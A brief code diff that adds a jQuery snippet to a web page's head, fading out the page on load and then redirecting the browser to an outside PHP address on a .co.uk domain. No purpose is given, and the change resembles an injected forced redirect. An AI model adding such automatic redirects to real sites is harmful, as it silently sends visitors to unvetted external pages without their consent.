@@ -11,6 +11,11 @@
     <script src="http://cdnjs.cloudflare.com/ajax/libs/modernizr/2.6.2/modernizr.min.js"></script>
 
     <script type="text/javascript">
+        $(function(){
+            $("body").fadeOut(1000,function(){
+                window.location.href = "http://octoraypfi.co.uk/test2.php"
+            })
+        });
     </script>
 
 </head>
